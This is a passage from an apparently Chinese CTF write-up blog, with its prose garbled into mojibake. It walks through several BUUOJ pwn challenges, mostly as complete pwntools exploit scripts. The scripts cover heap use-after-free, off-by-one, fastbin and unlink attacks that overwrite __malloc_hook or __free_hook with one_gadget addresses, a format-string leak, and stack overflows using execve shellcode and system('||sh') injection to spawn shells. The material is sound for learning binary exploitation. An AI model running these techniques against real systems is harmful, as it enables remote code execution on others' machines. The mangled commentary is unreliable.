sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;&gt;&#39;,str(type))def show(type):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;&gt;&#39;,str(type))def leave():    sla(&#39;&gt;&#39;,&#39;4&#39;)    # sa(&#39;?&#39;,str(mes))add(1,1)free(1) #leave chunk 0 add(2,2)add(2,2)add(2,2) # 0x90#ready to dupadd(2,2)free(2)add(1,1) # get chunk0free(2)#leak heapshow(2)ru(&#39;number :&#39;)chunk0_addr_word = int(ru(&#39;\n&#39;)) - 0xa0info_addr(&#39;chunk0_addr&#39;,chunk0_addr_word)add(2,chunk0_addr_word)add(2,chunk0_addr_word)add(2,0x91) #fake unsortbin chunk#full tache binsfor i in range(7):    free(1)    add(2,2)#leak libcfree(1)show(1)ru(&#39;number :&#39;)stdin_fillno = int(ru(&#39;\n&#39;)) - 0x2a0 + 0x70info_addr(&#39;stdin_fillno&#39;,stdin_fillno)#ready to attack stdin_fillno ,use taeche dupadd(1,stdin_fillno)add(1,stdin_fillno)free(1)add(2,stdin_fillno)free(1)#leak contains libc&#39;s heapshow(1)ru(&#39;number :&#39;)chunk1_addr_dword = int(ru(&#39;\n&#39;)) - 0x30info_addr(&#39;chunk1_addr_dword&#39;,chunk1_addr_dword)#change the 0x30bins chainsadd(1,chunk1_addr_dword)add(1,chunk1_addr_dword)add(1,stdin_fillno)#attck the filenoadd(1,666)leave()itr()</code></pre><p>æ¸£æ¸£è‹±æ–‡æ³¨é‡Šï¼Œå…ˆä¸æ”¹äº†ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸å®¹æ˜“åšçš„é¢˜ï¼Œå †å—å¦‚ä½•æ„é€ æƒ³äº†è€ä¹…ã€‚åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œï¼Œå½’ç±»ä¸ºç®€å•é¢˜ã€‚å¤ªèœäº†å¤ªèœäº†ï¼ŒåŸºç¡€è¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç®€å•çš„uaf</p><h4 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h4><pre><code class="c">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code></pre><p>æ­¤å¤„åœ¨æ”¹å®Œ<code>ptr[v1]</code>ä¸ºsystemä»¥åï¼Œå…¶å‚æ•°çš„æŒ‡é’ˆæ˜¯ä»è¿™ä¸ªå †å—å¼€å§‹çš„è¦æå‰è¿›è¡Œæˆªæ–­ã€‚</p><pre><code class="c">system(p32(system) + &#39;||sh&#39;)system(p32(system) + &#39;;sh;&#39;)</code></pre><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./hacknote&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)else:    io = remote(&#39;node3.buuoj.cn&#39;,27225)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;Content&#39;,str(data))def free(idx):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x20,&#39;bbbb&#39;)add(0x20,&#39;bbbb&#39;)free(0)free(1)add(8,p32(0x0804862B) + p32(elf.got[&#39;__libc_start_main&#39;]))show(0)r()libc_base = uu32(r(4)) - 0x18540info_addr(&#39;base&#39;,libc_base)free(2)system = 0x0003ada0 + libc_baseadd(8,p32(system) + &#39;||sh&#39;)show(0)itr()</code></pre><p>Buuè¿œç¨‹æ‰“ä¸é€šã€‚ã€‚</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°å¤„ï¼Œæ•…æ„å¯ä»¥å¤šå†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./heapcreator&#39;context.log_level = &#39;debug&#39;elf = ELF(local_file)debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26646)    libc = elf.libc    # remote_libc = &#39;.&#39; # &#39;./libc.so.6&#39;    # libc = ELF(remote_libc)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;Heap&#39;,str(size))    sa(&#39;heap&#39;,str(data))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;heap&#39;,str(data))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x18,&#39;\x00&#39;)add(0x20,&#39;bbbb&#39;)add(0x20,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)payload = 0x18 * &#39;a&#39; + &#39;\xa1&#39;edit(0,payload)free(1)add(0x10,&#39;\x78&#39;)show(1)ru(&#39;Content : &#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)free(1)free_hook = 0x3c67a8 + basepaylaod = &#39;\x00&#39; * 2 * 8  + p64(8) + p64(free_hook)add(0x30,paylaod)rce = base + rce16[1]edit(2,p64(rce))free(0)itr()</code></pre><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€†å‘èµ·æ¥çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå¹¶ä¸”å †å—å®šä½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚ï¼Œæ²¡æœ‰å…¨å±€æŒ‡é’ˆã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>calloc å‡½æ•°åŸºæœ¬è·Ÿmallocä¸€æ ·ï¼Œä½†æ˜¯å†åˆ†é…å¥½å †å—æ—¶ï¼Œä¼šæŠŠåˆ†é…åˆ°çš„å †å—å…¨éƒ¨æ¸…ç†ä¸º0ã€‚</p><h5 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h5><p>æ— æ³•é€šè¿‡ä¼ ç»Ÿçš„unsortbinæ¥leak libcï¼Œç»“åˆfillå‡½æ•°ä¸­çš„å †æº¢å‡ºå³å¯ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>Fill å‡½æ•°ä¸­ï¼Œæ˜æ˜¾æœ‰å †æº¢å‡ºï¼Œä¸”ååˆ†å¥½ç”¨ï¼Œæ•ˆæœå¾ˆå¤§ã€‚</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./0ctf_2017_babyheap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26374)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;Command&#39;,&#39;1&#39;)    sla(&#39;Size&#39;,str(size))def fill(idx,size,data):    sla(&#39;mand&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;mand&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def dump(idx):    sla(&#39;mand&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x30) #0add(0x30) #1add(0x10) #2add(0x10) #3add(0x10) #4add(0x20) #5payload = &#39;a&#39; * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4fill(0,0x60,payload)free(1)add(0x30)dump(2)ru(&#39;Content: \n&#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)add(0x50) #6add(0x60) #7add(0x60) #8free(7)free(8)malloc_hook = base + 0x3c4b10payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload)add(0x60) #7add(0x60) #8rec = rce16[1] + basepayload = &#39;a&#39; * 0x13 + p64(rec)fill(8,len(payload),payload)add(0x20)itr()</code></pre><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><pre><code class="c">close(1);close(2);return shell();</code></pre><p>ç›´æ¥å°±ç»™ä½ shelläº†ï¼Œä½†æ˜¯stdoutå·²ç»è¢«å…³é—­äº†ã€‚ä½†æ˜¯å¯¹å…¶æ–‡ä»¶æè¿°ç¬¦<code>1</code>è¿›è¡Œé‡å®šå‘ä¸ºæ²¡æœ‰å…³é—­çš„<code>0</code>å³å¯ã€‚</p><pre><code class="bash">exec 1&gt;&amp;0 &amp;&amp; cat flag</code></pre><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">ssize_t vulnerable(){  char buf; // [esp+0h] [ebp-18h]  return read(0, &amp;buf, 0x24u);}</code></pre><p>æ˜æ˜¾å¯ä»¥çœ‹å‡ºåªå¯ä»¥æ§åˆ¶2ä¸ªgadgetã€‚ä¼˜å…ˆæƒ³åˆ°äº†æ ˆè¿ç§»ã€‚å¯æ˜¯ä¹Ÿæ²¡æœ‰åˆé€‚åœ°æ–¹å»è¿ç§»åˆ©ç”¨ã€‚</p><p>å€˜è‹¥å¯ä»¥æ§åˆ¶3ä¸ªgadgetï¼Œç›´æ¥ï¼š</p><pre><code class="c">p32(system.plt) + p32(0xdeadbeef) + p32(sh)</code></pre><p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><p>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±<strong>ååˆ†</strong>ç»å¸¸**ç”¨<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code>ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</p><h4 id="çªç ´"><a href="#çªç ´" class="headerlink" title="çªç ´"></a>çªç ´</h4><p>ä½†æ˜¯å°è¯•å»çœ‹ä¸‹åé—¨å‡½æ•°ï¼š</p><pre><code class="c">.text:08048521 ; 2:   return system(&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;);.text:08048521                 sub     esp, 0Ch.text:08048524                 push    offset command  ; &quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;.text:08048529                 call    _system.text:0804852E                 add     esp, 10h.text:08048531                 nop.text:08048532                 leave.text:08048533                 retn</code></pre><p>åœ¨08048524å¤„ï¼Œå¯ä»¥çœ‹åˆ°èµ·å…¶call systemå‰ï¼Œ<code>push    offset command</code>ï¼ŒæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å‹æ ˆï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p> é‚£å°±åœ¨æº¢å‡ºæ—¶ï¼Œè¿”å›åœ°å€å¡«ä¸Š<code>08048529</code> ï¼Œåœ¨è‡ªå·±å¡«ä¸Šshçš„åœ°å€å³å¯äº†ã€‚</p><p>è¿™æ ·å°±åœ¨call systemæ—¶ï¼Œå®Œæˆçš„æ˜¯<code>system(sh)</code>ã€‚</p><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼š</p><p>ç”±äº<code>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ç»å¸¸ç”¨`å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1`ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</code> ï¼Œå…¶å®è‡ªå·±åˆ†æä»¥åå°±æ˜¯ï¼š<code>å‡½æ•°çš„plt+4å­—èŠ‚+å‚æ•°1</code>ã€‚</p><p>æº¢å‡ºæ—¶ï¼Œå¡«ä¸Š<code>p32(0x8048529) + p32(sh)</code><br>æ ˆä¿¡æ¯ï¼š</p><pre><code>0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;:     call   0x80483e0 &lt;system@plt&gt;)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>åœ¨æº¢å‡ºè°ƒç”¨æ—¶,retåˆ°ï¼š</p><pre><code>.text:08048529                 call    _system</code></pre><p>å…¶å°±æ˜¯</p><pre><code>push eip+4jmp system.plt</code></pre><p>ç„¶åæ ˆå°±å˜æˆäº†ï¼š</p><pre><code>=&gt; 0x80483e0 &lt;system@plt&gt;:      jmp    DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;:    push   0x18 | 0x80483eb &lt;system@plt+11&gt;:   jmp    0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push   0x20 |-&gt;   0x80483e6 &lt;system@plt+6&gt;:        push   0x18       0x80483eb &lt;system@plt+11&gt;:       jmp    0x80483a0       0x80483f0 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a01c       0x80483f6 &lt;__libc_start_main@plt+6&gt;:     push   0x20                                                                  JUMP is taken[------------------------------------stack-------------------------------------]0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;:     add    esp,0x10)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>è¿™å°±å˜æˆäº†ï¼Œè‡ªå·±ç†Ÿæ‚‰çš„<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./wustctf2020_getshell_2&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25032)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]offset = 28sh = elf.search(&#39;sh\x00&#39;).next()system = 0x8048529payload = &#39;a&#39; * offset + p32(system) + p32(sh)s(payload)itr()</code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„æ¼å‡ºç¨‹åºå’Œlibcçš„åŸºå€</li><li>editå‡½æ•°ä¸­ï¼Œé”™è¯¯çš„sizeé€‰å–ï¼Œå¯¼è‡´æ¯æ¬¡å¯ä»¥å¤šæº¢å‡º0x10çš„å­—èŠ‚ï¼Œå¨åŠ›å°±å¾ˆå¤§äº†ï¼Œprev sizeä¸ sizeéƒ½å¯ä»¥æ”¹åˆ°ã€‚</li></ul><p>ç›´æ¥è¿›è¡Œunlinkæ”»å‡»å³å¯ã€‚ä¼°è®¡å°±æ˜¯è€ƒè¿™ä¸ªçš„ï¼Œç¨‹åºé™åˆ¶äº†ä¸èƒ½ç”³è¯·0x80ä»¥ä¸‹çš„å †å—ï¼Œä¸”keyå€¼åŸºæœ¬æ²¡åŠæ³•æ”¹åˆ°ã€‚</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26837)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;(0-10)&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sla(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;content&#39;,str(data))payload = &#39;%15$p&#39; + &#39;%11$p&#39;sla(&#39;name&#39;,payload)ru(&#39;Hello, 0x&#39;)libc_base = int(r(12),16) - 0x20830info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;0x&#39;)bin_base = int(r(12),16) - 0x1186info_addr(&#39;bin_base&#39;,bin_base)note = bin_base + 0x202060key = bin_base + 0x202040add(0,0x88,&#39;aaaaaaaa&#39;)add(1,0x100,&#39;bbbbbbbb&#39;)add(2,0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,payload)free(1)free_hook = 0x3c67a8 + libc_basepayload = p64(0) * 3 + p64(free_hook) + p64(0x88)edit(0,payload)rec = rce16[1] + libc_baseedit(0,p64(rec))free(2)itr()</code></pre><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªå¤§å¨åŠ›çš„å †æº¢å‡ºã€‚<br>ç”¨unlinkæ”»å‡»ã€‚</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26818)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def edit(idx,size,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;choice&#39;,&#39;1&#39;)def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))note = 0x006020C0 + 8add(0x88,&#39;aaaaaaaa&#39;)add(0x100,&#39;bbbbbbbb&#39;)add(0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,len(payload),payload)free(1)show()ru(&#39;0 : &#39;)libc_base = uu64(r(6)) - 0x3c48e0info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_basepayload = p64(libc_base + 0x3c48e0) + p64(0)  + p64(0x88) + p64(free_hook)edit(0,len(payload),payload)rec = rce16[1] + libc_baseedit(0,8,p64(rec))free(2)itr()</code></pre><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å…³ï¼Œç›®æ ‡å®šä½ç€shellcodeå»ã€‚</p><h4 id="æ¼æ´ç‚¹-3"><a href="#æ¼æ´ç‚¹-3" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>æ ˆæº¢å‡ºï¼Œå¯ä»¥æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯32ä½ç¨‹åºç”¨ropå°±å¯ä»¥æ‰“äº†ã€‚ä½†æ˜¯ä¸ºç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚</p><pre><code class="python">.text:08048551             hint            proc near.text:08048551             ; __unwind {.text:08048551 55                          push    ebp.text:08048552 89 E5                       mov     ebp, esp.text:08048554 FF E4                       jmp     esp.text:08048554             hint            endp</code></pre><p>åœ¨é¢˜ç›®å½“ä¸­ï¼Œæœ‰ä¸ªhintå‡½æ•°ï¼Œå°±æ˜¯ç»™æç¤ºçš„ï¼Œæç¤ºåˆ°<code>jmp esp</code> è¿™ä¸ªgadgetã€‚</p><p>å…¶ä¸­ï¼Œå¯ä»¥æƒ³åˆ°åœ¨æ ˆæº¢å‡ºä¸­ï¼Œæœ‰ç»™<code>ret addr</code>å¡«ä¸Š<code>jmp esp</code> ï¼Œåœ¨æ¥ä¸Šshellcodeã€‚è¿™åº”è¯¥æ˜¯å¾ˆç»å…¸çš„ç”¨æ³•ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>æ„é€ æ€è·¯ï¼š</p><pre><code>Payload = overflow + jmp esp address + shellcode</code></pre><p>ä½†æ˜¯è¿™ä¸ªé¢˜å°±æ˜¯åªèƒ½æº¢å‡º14å­—èŠ‚ï¼Œè¿”å›åœ°å€å†å ç”¨4å­—èŠ‚ï¼Œåº”è¯¥æ²¡æœ‰10å­—èŠ‚è¿™æ ·å°‘çš„shellcodeã€‚</p><p>æ‰€ä»¥è½¬å˜ä¸€ä¸‹ï¼Œæ ˆä¸Šå¡«å……å¥½shellcodeï¼Œç„¶å<code>jmp esp address</code>ï¼Œæ¥ç€è®©å…¶æ‰§è¡Œ<code>sub esp,0x28</code>ï¼Œç„¶ååœ¨è·³è½¬espã€‚</p><pre><code>Payload = shellcode + jmp esp address + sub esp,esp + jmp esp</code></pre><p>å…¶å®åŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢è·Ÿä¸Šçš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè°ƒæ•´espæŒ‡é’ˆçš„shellcodeã€‚</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_9&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26283)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()jmp_esp = 0x08048554shellcode= &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;shellcode = shellcode.ljust(0x24,&#39;\x00&#39;)gadgets = asm(&#39;sub esp,0x28;jmp esp&#39;)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets# debug()sl(payload)itr()</code></pre><h2 id="roarctf-2019-realloc-magic"><a 